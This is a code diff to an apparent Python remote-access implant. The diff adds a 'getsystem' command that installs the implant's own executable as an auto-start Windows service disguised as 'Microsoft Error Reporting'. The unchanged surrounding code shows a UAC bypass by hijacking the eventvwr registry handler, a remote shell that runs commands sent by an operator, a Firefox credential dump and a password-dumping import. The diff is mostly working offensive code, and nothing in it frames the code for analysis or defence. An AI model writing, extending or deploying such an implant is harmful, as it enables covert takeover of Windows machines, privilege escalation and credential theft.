@@ -14,11 +14,11 @@ import hashlib
 import ctypes
 import getpass
 import sys
-import passdump
 
 if os.name == "nt":
+	import passdump
 	import win32net
-
+	
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
 def windows_only(func):
@@ -215,7 +215,7 @@ class Execute:
 		timer.cancel()
 		self.killed = False
 		logging.debug("Result of shell command: "+out.strip())
-		return out
+		return proc.returncode, out
 		
 class Filesystem:
 	"""
@@ -267,16 +267,34 @@ class Privilege_Escalation:
 			logging.debug("UAC bypass failed: Current user is not part of admin group.")
 			return "Current user is not part of admin group."
 		 
-		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
+		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
 			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
 			return "UAC is disabled or notification policy is set to 'Always'"
 			
-		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
-		logging.debug(execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"'))
+		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
+		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
 		os.startfile("eventvwr.exe")
 		time.sleep(2)
-		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
+		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		return "BG_NEW_SESH"
+		
+	@windows_only
+	def create_service(self, path, name):
+		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto") != 0:
+			return False
+		execute.execute_shell_command("sc start "+name)
+		return True
+		
+	@windows_only
+	def remove_service(self, name):
+		execute.execute_shell_command("sc delete "+name)
+		
+	@windows_only
+	def get_system(self):
+		if not misc.isadmin(): return "[-]You need admin privileges to get system."
+		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
+		return "BG_NEW_SESH"
+		
 		
 class Information_Gathering:
 	"""
@@ -326,8 +344,10 @@ class Shell:
 				output = info.dump_firefox()
 			elif data == "die":
 				os._exit(0)
+			elif data == "getsystem":
+				output = privesc.get_system()
 			else:
-				output = execute.execute_shell_command(data)
+				output = execute.execute_shell_command(data)[1]
 				
 			self.send(str(output)+"\n"+os.getcwd()+">>")
 		
